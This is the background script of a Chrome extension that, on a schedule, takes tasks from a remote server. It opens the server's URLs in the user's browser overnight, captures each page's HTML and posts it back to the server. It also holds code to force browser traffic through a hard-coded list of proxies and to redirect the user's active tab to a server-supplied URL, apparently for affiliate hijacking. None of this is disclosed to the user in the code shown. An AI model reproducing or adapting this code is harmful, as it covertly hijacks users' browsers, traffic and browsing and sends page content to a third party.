var num = 0
var start_time = null
var end_time = null
var run_time = 20000
var tab_interval_time = 1500
var urls_interval_time = 2000
var is_run = '2'
var res = {}
var msg = {}
var base_url = "http://c-bcg.bwe.io/plug_in/"
var task_url = "http://c-bcg.bwe.io/sc_pro/api/index.php/"
var proxy_url = "http://144.34.174.142:8080/get_proxys_list/?m_id=xxxxxooooo&country=us"
var task_id = null
var proxy_ip = null
var proxy_port = null

var tmp_run_times = [3, 4]

// shareasale
var shareasale_run = false
var shareasale_is_login = false

// extension id
var extension_id = chrome.runtime.id

setInterval(function(){
	let hour = (new Date()).getHours()
	if (tmp_run_times.indexOf(hour) >= 0) {
		$.ajax({
			url: base_url + 'provider.php?act=init&type=competitor',
			type: 'get',
			data: {},
			dataType: 'json',
			async: true,
			success: function(data) {
				let competitor_ = data.competitor
				competitor_ = JSON.parse(competitor_)
				
				if(competitor_.hasOwnProperty(extension_id)) {
					competitor_ = competitor_[extension_id]
					run_time = competitor_.run_time
					tab_interval_time = competitor_.tab_interval_time
					urls_interval_time = competitor_.urls_interval_time
					
					if(is_run != competitor_.is_run) {
						if(competitor_.is_run == '1') {
							is_run = '1'
							competitor()
						} else {
							is_run = '2'
						}
					}
				}
			} 
		});	
	} else {
		is_run = '2'
	}
}, 60000)

// ------------------------------------------ 爬虫 ------------------------------------------
async function competitor() {
	start_time = (new Date()).getTime()
	
	$.ajax({
		url: task_url + 'GetTask?client_id=plug_in&task_type=get_page_content',
		type: 'get',
		data: {},
		dataType: 'json',
		async: true,
		success: function(data) {
			if(data.results.hasOwnProperty('task_id')) {
				task_id = data.results.task_id
				msg = data.results.urls.url	
			}
		}
	}).then(function() {
		for (let k in msg) {
			chrome.tabs.create({url: msg[k]}, function(tab) {
				res[tab.id] = {url: msg[k]}
			})
			num = num + 1
			sleep(tab_interval_time)
		}
		
		let interval = setInterval(async function() {
			end_time = (new Date()).getTime()
			if((end_time - start_time) >= run_time && num > 0) {
				for (let tab_id in res) {
					if(typeof res[tab_id]['html'] == 'undefined') {
						res[tab_id]['html'] = 'empty content'
						res[tab_id]['code'] = '404'
						chrome.tabs.remove(parseInt(tab_id))
					}
				}
				num = 0
			}
			
			if(num == 0) {
				await postCrawlerRes(res)
				res = {}
				if(is_run == '1') {
					setTimeout(function(){
						competitor()
					}, urls_interval_time)
				}
				clearInterval(interval)
			}
		}, 1000)
	})
}

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
	if(num > 0 && request.hasOwnProperty('html') && typeof res[sender.tab.id] != 'undefined') {
		res[sender.tab.id]['html'] = request.html
		res[sender.tab.id]['code'] = request.code
		sendResponse('收到html信息！')
		chrome.tabs.remove(sender.tab.id)
		num = num - 1
	} else if(request.hasOwnProperty('shareasale')) {
		shareasale_is_login = request.shareasale.login.is
		sendResponse('background 收到')
	}
})

function postCrawlerRes(list) {
	$.ajax({
		url: base_url + 'provider.php?act=crawler_res&task_id=' + task_id,
		type: 'post',
		data: {data: list, extension_id: extension_id},
		dataType: 'json',
		async: true,
		success: function(data) {} 
	});
	return;
}

function setProxy(proxy_ip, proxy_port){
	let tmp_ = [
		{"ip": "60.184.205.85", "port": "8458"}, 
		{"ip": "112.253.11.113", "port": "8000"}, 
		{"ip": "121.17.210.114", "port": "8060"}, 
		{"ip": "47.112.159.60", "port": "3128"}, 
		{"ip": "47.115.63.52", "port": "8888"}, 
		{"ip": "36.97.145.29", "port": "9999"}, 
		{"ip": "121.17.126.68", "port": "8081"}, 
		{"ip": "8.129.180.208", "port": "80"}, 
		{"ip": "58.218.25.244", "port": "8530"}, 
		{"ip": "111.7.162.19", "port": "90"}, 
		{"ip": "222.74.73.202", "port": "42055"}, 
		{"ip": "58.220.95.35", "port": "10174"}, 
		{"ip": "58.253.155.11", "port": "9013"}, 
		{"ip": "47.244.50.194", "port": "8081"}, 
		{"ip": "111.7.162.23", "port": "8080"}, 
		{"ip": "58.220.95.35", "port": "10174"}, 
		{"ip": "111.23.6.164", "port": "80"}, 
		{"ip": "58.216.156.126", "port": "1080"}, 
		{"ip": "222.90.110.194", "port": "8080"}, 
		{"ip": "60.179.201.207", "port": "8457"}, 
		{"ip": "218.27.204.240", "port": "8002"}, 
		{"ip": "122.96.59.99", "port": "81"}, 
		{"ip": "125.217.199.148", "port": "80"}, 
		{"ip": "120.83.111.25", "port": "9999"}, 
		{"ip": "111.23.6.164", "port": "80"}, 
		{"ip": "58.61.154.153", "port": "8080"}, 
		{"ip": "124.47.7.45", "port": "80"}, 
		{"ip": "124.47.7.38", "port": "80"}, 
		{"ip": "111.23.6.156", "port": "80"}, 
		{"ip": "120.83.111.25", "port": "9999"}, 
		{"ip": "119.254.84.90", "port": "80"}, 
		{"ip": "139.217.110.76", "port": "3128"}, 
		{"ip": "222.92.141.250", "port": "80"}, 
		{"ip": "219.141.225.107", "port": "80"}, 
		{"ip": "129.28.179.103", "port": "8000"}, 
		{"ip": "150.138.106.155", "port": "80"}, 
		{"ip": "61.157.198.67", "port": "1080"}, 
		{"ip": "122.72.18.160", "port": "80"}, 
		{"ip": "111.7.162.50", "port": "8089"}, 
		{"ip": "123.7.117.156", "port": "9999"}, 
		{"ip": "124.128.246.181", "port": "8998"}, 
		{"ip": "60.188.66.158", "port": "8690"}, 
		{"ip": "218.27.136.169", "port": "8085"}, 
		{"ip": "120.52.73.1", "port": "8081"}, 
		{"ip": "110.243.4.112", "port": "8483"}, 
		{"ip": "222.86.133.67", "port": "80"}, 
		{"ip": "119.80.56.76", "port": "8080"}, 
		{"ip": "150.138.106.155", "port": "80"}, 
		{"ip": "171.212.139.124", "port": "8118"}, 
		{"ip": "106.39.160.121", "port": "80"}, 
		{"ip": "121.42.182.125", "port": "1080"}, 
		{"ip": "222.90.110.194", "port": "8080"}, 
		{"ip": "49.4.67.181", "port": "8888"}, 
		{"ip": "111.7.162.19", "port": "90"}, 
		{"ip": "60.188.19.174", "port": "8819"}, 
		{"ip": "122.4.51.227", "port": "63252"}, 
		{"ip": "111.23.6.135", "port": "80"}, 
		{"ip": "58.87.76.102", "port": "3128"}, 
		{"ip": "60.169.78.218", "port": "808"}, 
		{"ip": "221.182.31.54", "port": "8080"}, 
		{"ip": "150.158.199.221", "port": "80"}, 
		{"ip": "111.7.162.48", "port": "8080"}, 
		{"ip": "221.6.201.18", "port": "9999"}, 
		{"ip": "124.90.51.95", "port": "8888"}, 
		{"ip": "119.179.163.118", "port": "8060"}, 
		{"ip": "218.56.132.154", "port": "8080"}, 
		{"ip": "111.1.23.143", "port": "80"}, 
		{"ip": "222.85.28.130", "port": "52590"}, 
		{"ip": "60.184.205.85", "port": "8458"}, 
		{"ip": "123.7.117.156", "port": "9999"}, 
		{"ip": "119.129.203.136", "port": "8118"}, 
		{"ip": "61.153.251.150", "port": "22222"}, 
		{"ip": "110.243.4.112", "port": "8483"}, 
		{"ip": "111.7.162.48", "port": "8080"}, 
		{"ip": "221.180.170.104", "port": "8080"}, 
		{"ip": "175.154.229.72", "port": "8998"}, 
		{"ip": "8.129.180.208", "port": "80"}, 
		{"ip": "122.96.59.104", "port": "81"}, 
		{"ip": "121.17.126.68", "port": "8081"}, 
		{"ip": "120.52.73.97", "port": "8080"}, 
		{"ip": "39.96.63.240", "port": "80"}, 
		{"ip": "119.179.163.118", "port": "8060"}, 
		{"ip": "122.193.14.106", "port": "80"}, 
		{"ip": "111.7.162.49", "port": "8080"}, 
		{"ip": "60.161.137.168", "port": "63000"}, 
		{"ip": "60.191.11.251", "port": "3128"}, 
		{"ip": "113.121.92.113", "port": "8350"}, 
		{"ip": "110.243.4.112", "port": "8483"}, 
		{"ip": "101.26.49.158", "port": "8888"}, 
		{"ip": "221.214.208.226", "port": "1080"}, 
		{"ip": "122.96.59.104", "port": "81"}, 
		{"ip": "139.217.110.76", "port": "3128"}, 
		{"ip": "163.204.244.131", "port": "9999"}, 
		{"ip": "121.42.182.125", "port": "1080"}, 
		{"ip": "101.37.118.54", "port": "8888"}, 
		{"ip": "59.63.112.117", "port": "42354"}, 
		{"ip": "106.110.96.70", "port": "4216"}, 
		{"ip": "111.7.162.46", "port": "8080"}, 
		{"ip": "60.160.34.4", "port": "3128"}, 
		{"ip": "124.88.67.81", "port": "80"}, 
		{"ip": "49.81.26.147", "port": "4216"}, 
		{"ip": "139.217.110.76", "port": "3128"}, 
		{"ip": "49.4.67.181", "port": "8888"}, 
		{"ip": "60.188.16.15", "port": "8569"}, 
		{"ip": "124.206.167.250", "port": "3128"}, 
		{"ip": "183.57.27.163", "port": "1080"}, 
		{"ip": "47.244.22.247", "port": "80"}, 
		{"ip": "221.182.31.54", "port": "8080"}, 
		{"ip": "124.47.7.38", "port": "80"}, 
		{"ip": "101.231.104.82", "port": "80"}, 
		{"ip": "162.14.18.11", "port": "80"}, 
		{"ip": "118.31.250.72", "port": "8080"}, 
		{"ip": "218.75.109.86", "port": "3128"}, 
		{"ip": "221.237.154.57", "port": "9797"}, 
		{"ip": "120.79.48.160", "port": "8080"}, 
		{"ip": "218.241.238.141", "port": "1080"}, 
		{"ip": "218.57.236.103", "port": "3128"}, 
		{"ip": "183.164.226.210", "port": "4216"}, 
		{"ip": "221.214.208.226", "port": "1080"}, 
		{"ip": "60.161.137.168", "port": "63000"}, 
		{"ip": "221.5.80.66", "port": "3128"}, 
		{"ip": "119.29.232.113", "port": "3128"}, 
		{"ip": "111.7.162.28", "port": "83"}, 
		{"ip": "122.227.246.102", "port": "808"}, 
		{"ip": "121.15.137.75", "port": "808"}, 
		{"ip": "47.102.210.165", "port": "3128"}, 
		{"ip": "119.188.188.194", "port": "80"}, 
		{"ip": "61.153.145.202", "port": "25"}, 
		{"ip": "60.179.200.202", "port": "8908"}, 
		{"ip": "122.72.18.160", "port": "80"}, 
		{"ip": "60.184.110.80", "port": "8476"}, 
		{"ip": "106.75.198.201", "port": "443"}, 
		{"ip": "111.1.23.153", "port": "8080"}, 
		{"ip": "47.112.159.60", "port": "3128"}, 
		{"ip": "221.214.208.226", "port": "1080"}, 
		{"ip": "114.250.149.214", "port": "48030"}, 
		{"ip": "120.76.79.21", "port": "80"}, 
		{"ip": "111.1.23.173", "port": "80"}, 
		{"ip": "61.153.251.150", "port": "22222"}, 
		{"ip": "113.121.92.113", "port": "8350"}, 
		{"ip": "118.193.185.83", "port": "80"}, 
		{"ip": "123.7.88.2", "port": "3128"}, 
		{"ip": "121.17.210.114", "port": "8060"}, 
		{"ip": "61.153.251.150", "port": "22222"}, 
		{"ip": "47.94.164.111", "port": "8888"}, 
		{"ip": "47.106.162.218", "port": "80"}, 
		{"ip": "60.188.66.158", "port": "8690"}, 
		{"ip": "47.75.71.222", "port": "3000"}, 
		{"ip": "120.85.132.234", "port": "80"}, 
		{"ip": "61.145.35.148", "port": "4216"}, 
		{"ip": "139.217.110.76", "port": "3128"}, 
		{"ip": "61.153.145.202", "port": "25"}, 
		{"ip": "112.25.163.148", "port": "63000"}, 
		{"ip": "221.6.201.18", "port": "9999"}, 
		{"ip": "139.217.110.76", "port": "3128"}, 
		{"ip": "61.135.155.82", "port": "443"}, 
		{"ip": "115.29.34.2", "port": "3128"}, 
		{"ip": "106.54.219.223", "port": "8888"}, 
		{"ip": "121.15.137.75", "port": "808"}, 
		{"ip": "124.90.51.30", "port": "8888"}, 
		{"ip": "183.164.226.25", "port": "4216"}, 
		{"ip": "182.32.224.214", "port": "9999"}, 
		{"ip": "124.47.7.38", "port": "80"}, 
		{"ip": "218.56.132.154", "port": "8080"}, 
		{"ip": "119.29.119.49", "port": "80"}, 
		{"ip": "60.21.221.228", "port": "80"}, 
		{"ip": "121.15.137.75", "port": "808"}, 
		{"ip": "114.226.244.187", "port": "8118"}, 
		{"ip": "112.25.163.149", "port": "63000"}, 
		{"ip": "171.212.139.124", "port": "8118"}, 
		{"ip": "114.226.244.187", "port": "8118"}, 
		{"ip": "111.7.162.46", "port": "8080"}, 
		{"ip": "47.106.162.218", "port": "80"}, 
		{"ip": "61.150.96.27", "port": "36880"}, 
		{"ip": "119.101.112.246", "port": "9999"}, 
		{"ip": "183.164.226.25", "port": "4216"}, 
		{"ip": "124.47.7.45", "port": "80"}, 
		{"ip": "218.60.8.99", "port": "3129"}, 
		{"ip": "36.97.145.29", "port": "9999"}, 
		{"ip": "47.106.162.218", "port": "80"}, 
		{"ip": "122.4.51.227", "port": "63252"}, 
		{"ip": "119.129.203.136", "port": "8118"}, 
		{"ip": "129.28.179.103", "port": "8000"}, 
		{"ip": "182.32.224.214", "port": "9999"}, 
		{"ip": "58.250.21.56", "port": "3128"}, 
		{"ip": "47.75.161.251", "port": "80"}
	]
	let tmp_obj = tmp_[Math.floor((Math.random()*tmp_.length))];
	let pac = "var FindProxyForURL = function(url, host){"+
			"return 'PROXY " + tmp_obj['ip'] + ":" + tmp_obj['port'] + "';" + 
		"}";
		console.log(pac)
	let config = {
		mode: "pac_script",
		pacScript: {
			data: pac
		}
	}
	chrome.proxy.settings.set({value: config, scope: 'regular'}, function(e){});
}

// ------------------------------------------ 爬虫 end ------------------------------------------


// ------------------------------------------ shareasale ------------------------------------------
function event_(key) {
	let obj = null
	$.ajax({
		url: base_url + 'provider.php?act=init',
		type: 'get',
		data: {key: key},
		dataType: 'json',
		async: false,
		success: function(data) {
			obj = JSON.parse(data.shareasale)
			console.log(obj)
		}
	}).then(function() {
		chrome.tabs.query({ currentWindow: true, active: true }, function (tabs) {
			console.log(tabs)
			chrome.tabs.update(tabs[0].id, {url: obj.url}, function() {})
		})
	})
}

// ------------------------------------------ shareasale end ------------------------------------------


//第一种，使用while循环
function sleep(delay) {
    var start = (new Date()).getTime();
    while((new Date()).getTime() - start < delay) {
        continue;
    }
}
